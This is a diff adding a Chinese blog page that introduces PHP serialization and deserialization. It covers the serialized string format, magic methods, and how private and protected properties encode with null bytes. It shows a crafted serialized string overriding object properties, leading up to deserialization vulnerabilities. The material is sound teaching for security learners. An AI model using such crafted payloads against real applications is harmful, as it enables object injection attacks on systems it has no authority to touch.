@@ -1,0 +1,654 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php反序列化 | lu1ux's blog</title><meta name="author" content="lu1ux"><meta name="copyright" content="lu1ux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP序列化什么是PHP序列化12serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串unserialize()   &#x2F;&#x2F;将字符串还原成一个对象  通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击 1234567891011&lt;?phphighlight_file(__FILE_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化">
+<meta property="og:url" content="http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="lu1ux&#39;s blog">
+<meta property="og:description" content="PHP序列化什么是PHP序列化12serialize()     &#x2F;&#x2F;将一个对象转换成一个字符串unserialize()   &#x2F;&#x2F;将字符串还原成一个对象  通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击 1234567891011&lt;?phphighlight_file(__FILE_">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/9.jpg">
+<meta property="article:published_time" content="2025-11-25T13:26:43.000Z">
+<meta property="article:modified_time" content="2025-11-25T13:27:19.729Z">
+<meta property="article:author" content="lu1ux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/9.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'php反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-25 21:27:19'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4066449_d5kq6u6u9dj.css"><link rel="stylesheet" href="/css/mine.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/9.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="lu1ux's blog"><span class="site-name">lu1ux's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">php反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-25T13:26:43.000Z" title="Created 2025-11-25 21:26:43">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-25T13:27:19.729Z" title="Updated 2025-11-25 21:27:19">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="php反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h2><h3 id="什么是PHP序列化"><a href="#什么是PHP序列化" class="headerlink" title="什么是PHP序列化"></a>什么是PHP序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize()     //将一个对象转换成一个字符串</span><br><span class="line">unserialize()   //将字符串还原成一个对象</span><br></pre></td></tr></table></figure>
+
+<p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class sunset&#123;</span><br><span class="line">    public $flag=&#x27;flag&#123;asdadasd&#125;&#x27;;</span><br><span class="line">    public $name=&#x27;makabaka&#x27;;</span><br><span class="line">    public $age=&#x27;18&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctfer=new sunset(); //实例化一个对象</span><br><span class="line">echo serialize($ctfer);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>返回结果</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;sunset&quot;:3:&#123;s:4:&quot;flag&quot;;s:14:&quot;flag&#123;asdadasd&#125;&quot;;s:4:&quot;name&quot;;s:8:&quot;makabaka&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>O代表对象，这里是序列化的一个对象，要序列化数组的就用A</li>
+<li>6表示的是类的长度</li>
+<li>sunset表示对是类名</li>
+<li>3表示类里面有3个属性也称为变量</li>
+<li>s表示字符串 4是字符串的长度<code>这里的flag表示属性</code>s表示字符串 14是字符串的长度 属性值为flag{asdadasd}</li>
+</ul>
+<h3 id="什么是反序列化"><a href="#什么是反序列化" class="headerlink" title="什么是反序列化"></a>什么是反序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$str=&#x27;O:6:&quot;sunset&quot;:3:&#123;s:4:&quot;flag&quot;;s:14:&quot;flag&#123;asdadasd&#125;&quot;;s:4:&quot;name&quot;;s:8:&quot;makabaka&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;&#x27;;</span><br><span class="line">$a=unserialize($str);</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
+
+<p>运行得到</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212713965.png" alt="image-20241127222043501"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">object(__PHP_Incomplete_Class)#1 (4) &#123; [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(6) &quot;sunset&quot; [&quot;flag&quot;]=&gt; string(14) &quot;flag&#123;asdadasd&#125;&quot; [&quot;name&quot;]=&gt; string(8) &quot;makabaka&quot; [&quot;age&quot;]=&gt; string(2) &quot;18&quot; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>看下面A B C类里面都有魔术方法,去学习一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__wakeup()</span><br><span class="line">__unset()</span><br><span class="line">__toString()</span><br><span class="line">__get()</span><br><span class="line">__invoke()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>__wakeup</code>：对象重新醒来，即<strong>由二进制串重新组成一个对象</strong>的时候（在一个对象被<strong>反序列化</strong>时调用）</p>
+<p><code>__unset()</code>:在<strong>不可访问的属性上使用unset()时</strong>触发</p>
+<p><code>__toString</code>：当一个对象<strong>被当作一个字符串</strong>处理时使用</p>
+<p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是调用一个类及其父类方法中未定义属性时</p>
+<p><code>__invoke()</code> :当脚本尝试<strong>将对象调用为函数时</strong>触发</p>
+<h2 id="php反序列化漏洞原理"><a href="#php反序列化漏洞原理" class="headerlink" title="php反序列化漏洞原理"></a>php反序列化漏洞原理</h2><p>基于php面向对象的知识进行漏洞利用</p>
+<h3 id="php面向对象基本概念"><a href="#php面向对象基本概念" class="headerlink" title="php面向对象基本概念"></a>php面向对象基本概念</h3><h4 id="面向过程和面向对象"><a href="#面向过程和面向对象" class="headerlink" title="面向过程和面向对象"></a>面向过程和面向对象</h4><p>面向过程是一种以事件为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。</p>
+<p>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个对象在整个解决问题的步骤中的属性和行为。</p>
+<h4 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h4><p>类是定义了一件事物的抽象特点,他将数据的形式以及这些数据上的操作封装在一起.</p>
+<p>对象是具有类类型的变量,是对类的实例.</p>
+<p><strong>内部构成</strong>:成员变量(属性)+成员函数(方法)</p>
+<p><strong>成员变量</strong>:定义在类内部的变量.该变量的值对外是不可见的,但是可以通过成员函数访问,在类被实例化为对象后,该变量即可成为对象的属性</p>
+<p><strong>成员函数</strong>:定义在类的内部,可用于访问对象的数据.</p>
+<p><strong>继承</strong>:继承性是子类自动共享父类数据结构和方法的机制,是类之间的一种关系.</p>
+<p>在定义和实现一个类的时候,可以在一个已经存在的类的基础上来进行,把一个已经存在的类所定义的内容作为自己的内容,并加入若干新的内容.</p>
+<p><strong>父类</strong>:一个类被其他类继承,可将该类成为父类,或基类,超类</p>
+<p><strong>子类</strong>:一个类继承其他类称为子类,也可称为派生类.</p>
+<h2 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h2><h3 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Class_name&#123;</span><br><span class="line">//成员变量(成员属性)声明</span><br><span class="line">//成员函数(成员方法)声明</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还有一个成员常量,在安全方面作用不大</p>
+<h3 id="实例化和赋值"><a href="#实例化和赋值" class="headerlink" title="实例化和赋值"></a>实例化和赋值</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class man&#123;                           //定义类(类名)</span><br><span class="line">var $name;                           //声明成员变量</span><br><span class="line">var $age;                            //var是一种修饰符</span><br><span class="line">function do($var1)&#123;                  //声明成员函数(方法)</span><br><span class="line">	echo $this-&gt;name;                //使用预定义$this调用成员变量</span><br><span class="line">	echo $var1;	                     //成员函数传参$var1可直接调用</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行这段代码,发现什么都不会回显</p>
+<p>需要进行实例化并且赋值,才可以回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"></span><br><span class="line">    var $name = &#x27;lulu&#x27;;</span><br><span class="line">    var $age;</span><br><span class="line">    function do($var1)&#123;</span><br><span class="line">        echo $this-&gt;name;</span><br><span class="line">        echo $var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$doge = new man();      //实例化类man()为对象doge</span><br><span class="line">$doge-&gt;name = &#x27;lu1ux&#x27;;  //参数赋值</span><br><span class="line">$doge-&gt;age = 20;        </span><br><span class="line">print_r($doge);         //打印对象doge</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对象不能用echo显示,只能用var_dump或者print_r</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212713934.png" alt="image-20241130120121118"></p>
+<p>成员方法不会随着对象一起显示,需要调用成员方法才会显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"></span><br><span class="line">    var $name = &#x27;lulu&#x27;;</span><br><span class="line">    var $age;</span><br><span class="line">    function do($var1)&#123;</span><br><span class="line">        echo $this-&gt;name;</span><br><span class="line">        echo &#x27;在干什么:&#x27;,$var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$doge = new man();</span><br><span class="line">$doge-&gt;name = &#x27;lu1ux&#x27;;</span><br><span class="line">$doge-&gt;age = 20;</span><br><span class="line">$doge-&gt;do(&#x27;在准备三面第二阶段&#x27;);   //调用函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212713987.png" alt="image-20241130120945117"></p>
+<h3 id="类的修饰符介绍"><a href="#类的修饰符介绍" class="headerlink" title="类的修饰符介绍"></a>类的修饰符介绍</h3><p>在类中直接声明的变量称为成员属性(也可以成为成员变量)</p>
+<p>可以在类中声明多个变量,即’对象’中可以有多个成员属性,每个变量都存储对象不同的属性信息</p>
+<p>访问权限修饰符:对属性的定义</p>
+<h4 id="常用访问权限修饰符"><a href="#常用访问权限修饰符" class="headerlink" title="常用访问权限修饰符"></a>常用访问权限修饰符</h4><h5 id="public"><a href="#public" class="headerlink" title="public"></a>public</h5><p>public修饰的属性和方法可以在任何地方被访问，包括类的内部、子类和外部代码。</p>
+<h5 id="protected"><a href="#protected" class="headerlink" title="protected"></a>protected</h5><p>protected修饰的属性和方法只能在当前类及其子类中被访问，外部的代码访问不了</p>
+<h5 id="private"><a href="#private" class="headerlink" title="private"></a>private</h5><p>private修饰的属性和方法只能在当前类中被访问，子类和外部代码不能访问。</p>
+<h3 id="类与对象-1"><a href="#类与对象-1" class="headerlink" title="类与对象"></a>类与对象</h3><p>类是对象的抽象,而对象是类的具体实例.</p>
+<p>类是想法,把类实例化(new),调用具体值后就变成了对象.</p>
+<h3 id="类的成员方法"><a href="#类的成员方法" class="headerlink" title="类的成员方法"></a>类的成员方法</h3><p>在类中定义的函数被称为成员方法.</p>
+<p>函数实现的是某个独立的功能;</p>
+<p>成员方法实现的是类中的一个行为,是类的一部分.</p>
+<p>可以在类中声明多个成员方法,成员方法的声明和函数声明完全一致,只不过在声明成员方法时可以在function关键字前加一些访问权限修饰符,如public,protected,private(可以省略,默认为public)</p>
+<h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>序列化(Serialization)是将对象的状态信息(属性)转换为可以存储或传输的形式的过程</p>
+<p>将对象或者数组转化为可储存&#x2F;传输的字符串</p>
+<p>在php中使用函数serialize()来将对象或者数组进行序列化,并返回一个包含字节流的字符串来表示.</p>
+<h3 id="表达方式"><a href="#表达方式" class="headerlink" title="表达方式"></a>表达方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;lulu&#x27;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212713909.png" alt="image-20241130123525933"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212713942.png" alt="image-20241130123536616"></p>
+<h4 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = array(&#x27;lulu&#x27;,&#x27;lu1ux&#x27;,&#x27;lhb&#x27;);</span><br><span class="line">echo serialize($a)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212713917.png" alt="image-20241130123918593"></p>
+<p>a是array数组</p>
+<p>3是三个参数</p>
+<p>{i:0编号0;s字符串:4字符串长度:}</p>
+<h4 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h4><p>对象只包含成员属性,也只会序列化成员属性,不会有成员方法.</p>
+<p>不能序列化<strong>类</strong>,但是可以序列化<strong>对象</strong></p>
+<p>改一下之前的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"></span><br><span class="line">    var $name = &#x27;lulu&#x27;;</span><br><span class="line">    var $age;</span><br><span class="line">    function do($var1)&#123;</span><br><span class="line">        echo $this-&gt;name;</span><br><span class="line">        echo &#x27;在干什么&#x27;,$var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$doge = new man();</span><br><span class="line">echo serialize($doge);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212714549.png" alt="image-20241130124452717"></p>
+<p>O:3:”man”:2:{s:4:”name”;s:4:”lulu”;s:3:”age”;N;}</p>
+<p>O是object:3是类名长度:”man”是类名:2是成员属性数量:{s字符串:4字符串名长度:”name”;s字符串:4字符串长度:”lulu”;s:3:”age”;N;}</p>
+<h4 id="private私有属性序列化时"><a href="#private私有属性序列化时" class="headerlink" title="private私有属性序列化时"></a>private私有属性序列化时</h4><p>会在变量名前加    (空字符)类名(空字符)     空字符是二进制的00  URL的%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class man&#123;</span><br><span class="line"></span><br><span class="line">    var $name = &#x27;lulu&#x27;;</span><br><span class="line">    private $age = 20;</span><br><span class="line">    function do($var1)&#123;</span><br><span class="line">        echo $this-&gt;name;</span><br><span class="line">        echo &#x27;在干什么&#x27;,$var1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$doge = new man();</span><br><span class="line">echo serialize($doge);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212714685.png" alt="image-20241130125548805"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;man&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;lulu&quot;;s:8:&quot; man age&quot;;i:20;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="protected受保护属性序列化时"><a href="#protected受保护属性序列化时" class="headerlink" title="protected受保护属性序列化时"></a>protected受保护属性序列化时</h4><p>在变量名前加        (空字符)*(空字符)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;man&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;lulu&quot;;s:6:&quot; * age&quot;;i:20;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>成员属性中也可以有对象</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212714697.png" alt="image-20241130135036542"></p>
+<p>序列化后得到字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:4:&quot;lulu&quot;;s:4:&quot; * b&quot;;i:666;s:7:&quot; test c&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再将它反序列化</p>
+<p>反序列化的时候需要把空格换成%00</p>
+<p>然后urldecode解码成空字符</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212714774.png" alt="image-20241130135422635"></p>
+<p>反序列化生成的对象里的值,由反序列化里的值提供,与原有类预定义的值无关</p>
+<p>反序列化不改变类的成员方法,需要调用方法后才能触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    public  $a = &#x27;lulu&#x27;;</span><br><span class="line">    protected  $b = 666;</span><br><span class="line">    private  $c = false;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        echo $this-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$d = &#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:5:&quot;lu1ux&quot;;s:4:&quot;%00*%00b&quot;;i:666;s:7:&quot;%00test%00c&quot;;b:0;&#125;&#x27;;</span><br><span class="line">$d = urldecode($d);</span><br><span class="line">$f = unserialize($d);</span><br><span class="line">$f-&gt;displayVar();</span><br></pre></td></tr></table></figure>
+
+<p>调用成员函数displayVar(),返回的也不是lulu,而是lu1ux</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212714769.png" alt="image-20241130140256115"></p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>反序列化漏洞的成因:反序列化过程中,unserialize()接收的值(字符串)可控,通过更改这个值(字符串),得到所需要的代码,即生成的对象的属性值.</p>
